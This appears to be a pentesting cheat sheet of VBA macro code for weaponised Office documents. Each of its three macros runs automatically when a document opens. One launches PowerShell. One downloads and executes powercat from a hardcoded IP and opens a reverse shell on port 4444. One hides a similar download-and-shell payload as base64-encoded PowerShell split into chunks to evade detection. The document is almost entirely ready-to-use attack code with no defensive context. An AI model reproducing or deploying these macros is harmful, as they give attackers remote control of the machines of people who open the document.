> Macro code is a programming code which is written in _VBA_ (Visual Basic for Applications) language


#VB

Macro to open powershell
```vb
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

Macro for reverse shell
```vb
Sub AutoOpen()
    mymacro
End Sub

Sub Document_Open()
    mymacro
End Sub

Sub mymacro()
    Dim Str As String
    
    Str = "powershell -c ""IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.69.169/powercat.ps1');powercat -c 192.168.69.169 -p 4444 -e powershell"

    CreateObject("Wscript.Shell").Run Str
End Sub
```

Macro for encoded powershell reverse shell command in chunks of 50
```vb
Sub AutoOpen()
    mymacro
End Sub

Sub Document_Open()
    mymacro
End Sub

Sub mymacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
	Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
	Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
	Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
	Str = Str + "ALgAxADYAOAAuADQANQAuADIAMAAxAC8AcABvAHcAZQByAGMAY"
	Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
	Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAxACAALQBwA"
	Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
	Str = Str + "A"

    CreateObject("Wscript.Shell").Run Str
End Sub
```